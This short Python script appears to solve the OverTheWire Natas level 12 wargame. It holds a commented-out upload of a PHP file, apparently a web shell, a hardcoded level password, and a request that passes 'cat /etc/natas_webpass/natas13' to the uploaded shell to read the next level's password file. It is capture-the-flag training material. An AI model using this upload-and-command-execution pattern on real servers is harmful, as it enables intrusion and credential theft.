import requests

username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
# response = session.post(url, files={"uploadedfile": open("natas12.php", "rb")}, data={
#                         "filename": "natas12.php", "MAX_FILE_SIZE": "1000"}, auth=(username, password))
response = session.get(url + "upload/ptnuqkqzr2.php?cmd=cat /etc/natas_webpass/natas13",
                       auth=(username, password))

content = response.text

print(content)
